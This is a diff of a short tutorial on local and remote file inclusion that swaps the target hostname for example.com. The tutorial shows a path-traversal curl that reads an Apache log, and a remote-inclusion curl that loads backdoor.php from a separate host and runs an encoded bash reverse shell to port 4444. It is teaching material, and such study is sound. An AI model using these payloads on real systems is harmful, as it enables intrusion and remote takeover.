@@ -25,7 +25,7 @@ Local File Inclusion (LFI) vulnerabilities allow attackers to include files from
 #### Practical Example
 
 ```bash
-kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+kali@kali:~$ curl http://example.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ...
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ...
@@ -61,14 +61,11 @@ Step-by-Step Example
 
 Practical Example
 ```bash
-curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
+curl "http://example.com/meteor/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
 ```
-
-Screenshots
-Command Execution on Target System
-
-Crafting the RFI Exploit
 
 ### Conclusion
 
 By understanding and exploiting RFI vulnerabilities, attackers can include and execute remote files on a target system, leading to severe security breaches. Proper security measures, such as disabling allow_url_include and validating input parameters, are essential to prevent such attacks.
+
+
